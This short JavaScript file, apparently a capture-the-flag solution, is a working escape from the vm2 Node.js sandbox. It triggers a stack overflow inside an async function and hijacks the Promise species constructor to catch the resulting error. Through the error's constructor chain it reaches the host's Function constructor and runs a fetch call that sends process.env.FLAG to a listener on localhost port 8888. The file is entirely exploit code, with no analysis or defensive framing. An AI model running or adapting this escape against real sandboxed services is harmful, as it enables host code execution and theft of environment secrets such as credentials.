import { NodeVM } from "vm2"
// const { NodeVM } = require("vm2")
const vm = new NodeVM({
    console: 'redirect'
});
const code = `
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return console.log(err.constructor.constructor('fetch("http://localhost:8888?"+process.env.FLAG)')()); }
            )
        }
    }
};
p.then();
`;
vm.on('console.log', console.log);
console.log(vm.run(code));
